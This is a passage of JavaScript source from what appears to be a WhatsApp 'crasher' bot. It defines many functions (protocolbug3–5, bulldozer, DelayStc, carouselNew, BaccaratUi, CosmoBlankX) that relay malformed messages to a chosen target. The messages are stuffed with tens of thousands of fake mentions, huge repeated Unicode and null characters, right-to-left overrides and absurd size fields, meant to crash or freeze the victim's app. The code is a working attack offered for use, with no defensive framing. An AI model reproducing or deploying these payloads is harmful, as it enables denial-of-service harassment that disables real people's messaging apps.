                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "???? ???????? - ????" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
  }
    
    async function protocolbug4(isTarget, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\nKurapika Is Here❗\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ Kurapika Is Here❗" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

  async function protocolbug5v2(isTarget, mention) {
    const maxMention = 65000; // mendekati batas JS maksimal
    const mentionedList = Array.from({ length: maxMention }, (_, i) =>
        `1${Math.floor(100000 + Math.random() * 900000)}@s.whatsapp.net`
    );

    const longUnicode = "៛" + "‌‎‏" + " ".repeat(500) + "៛".repeat(20000);

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".𝐓𝐢𝐠𝐞𝐫 ϟ 𝐂𝐫𝐚𝐬𝐡 𝐕𝟏 𝐆𝐞𝐧 𝟐" + longUnicode,
        title: "TigerCrashV1Gen2🐉〽️" + longUnicode,
        artworkDirectPath: "/v/t62.76458-24/...",
        artworkSha256: "fakehash==",
        artworkEncSha256: "fakehashenc==",
        artistAttribution: "https://instagram.com/_u/tamainfinity_",
        countryBlocklist: false,
        isExplicit: true,
        artworkMediaKey: "fakekey=="
    };

    const annotations = Array.from({ length: 5 }, () => ({
        embeddedContent: { embeddedMusic },
        embeddedAction: true
    }));

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/...",
        mimetype: "video/mp4",
        fileSha256: "fakebase64==",
        fileLength: "999999",
        seconds: 30,
        mediaKey: "fakeMediaKey==",
        caption: "𐌕𐌀𐌌𐌀 RTL\u202eBUG\u202c𐍂𐍉𐍂" + longUnicode,
        height: 720,
        width: 1280,
        fileEncSha256: "fakeenc==",
        directPath: "/v/t62.7161-24/...",
        mediaKeyTimestamp: `${Date.now()}`,
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363419449326001@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "fakeSidecar==",
        thumbnailDirectPath: "/v/t62.36147-24/...",
        thumbnailSha256: "fakehash==",
        thumbnailEncSha256: "fakeenc==",
        annotations
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        
async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));
    
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Kurapika Is Here❗〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "Kurapika Is Here❗r? Come Heree!!!🐍〽"
                        }
                    },
                    description: "Kurapika Is Here?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}


// Func Neww!!
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "CikssXyz?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363419449326001@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await asep.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await asep.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}


async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "CikssXyz" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Kurapika Is Here❗ ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await asep.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("flixce Sending Carousel New !!");
  }
}
        
// Func Buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await asep.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
async function DelayStc(isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await asep.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}


// Send Pairing
async function SendPairing(isTarget, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await asep.relayMessage(isTarget, messageContent, Ptcp ? {
      participant: {
        jid: isTarget
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}


async function SockMentionJid3(target, Ptcp = false) {
      await asep.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    
 async function BaccaratUi(target) {
  await asep.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}

async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
